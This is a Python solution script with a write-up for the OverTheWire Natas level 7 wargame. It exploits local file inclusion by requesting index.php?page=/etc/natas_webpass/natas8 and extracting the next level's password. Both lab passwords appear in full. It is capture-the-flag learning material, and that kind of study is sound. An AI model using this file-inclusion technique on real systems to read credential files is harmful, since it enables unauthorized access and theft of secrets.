#!/usr/bin/env python3
'''
Web Hacking: Local File Inclusion
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas7.py

https://docs.python-requests.org/en/master/
https://docs.python-requests.org/en/master/user/quickstart/#cookies

Level 7 → Level 8
Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
problem : On successfully logging in the natas7 webpage, we are given
two links, Home and About.
write up:
 1.  Check the Source Code of the page.
    Here, we can see the links “index.php?page=” .
	We have  also hinted the location of the password, that is
         	/etc/natas_webpass/natas8.
 2. click  the Home link.
    Output:
        url of thus page is
		 http://natas7.natas.labs.overthewire.org/index.php?page=home
 3. Change this  url to
   http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
   output :
      DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe



'''
import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'


url0 = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url0, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)
hinted_location = '/etc/natas_webpass/natas8'
print('\n2. URL0 = ',url0)
url1 = url0 + hinted_location
print('\n3. hinted_location = ',url1)

url3 = url0 + 'index.php?page=' + hinted_location
print('\n4. n = ',url3)

response = session.get(url3, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)
password = re.findall('<br>\n(.*)\n\n<!--', content)[0]
print ('Password for natas8:',password)